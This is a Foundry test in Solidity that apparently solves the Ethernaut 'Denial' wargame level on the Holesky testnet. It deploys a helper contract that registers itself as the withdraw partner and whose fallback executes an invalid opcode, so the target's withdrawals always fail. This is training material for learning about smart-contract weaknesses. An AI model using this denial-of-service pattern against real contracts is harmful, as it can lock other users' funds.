// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console} from "../../lib/forge-std/src/Test.sol";
import {Vm} from "../../lib/forge-std/src/Vm.sol";
import {Denial} from "../../src/Ethernaut/Denial.sol";

contract DenialAttack is Test {
    function setUp() public {
        vm.createSelectFork(vm.rpcUrl("holesky"));
    }

    function testExploit() public {
        address playerAddress = 0xB3D6fac08D421164A414970D5225845b3A91F33F;
        Denial denial = Denial(
            payable(0x0c3139764C0dED84724A84904BBBbF445a56707f)
        );

        vm.startPrank(playerAddress);
        new Helper(denial);
        vm.stopPrank();

        // 验证不太好写，直接上链验证了
    }
}

contract Helper {
    constructor(Denial denial) {
        denial.setWithdrawPartner(address(this));
    }

    fallback() external payable {
        assembly {
            invalid()
        }
    }
}
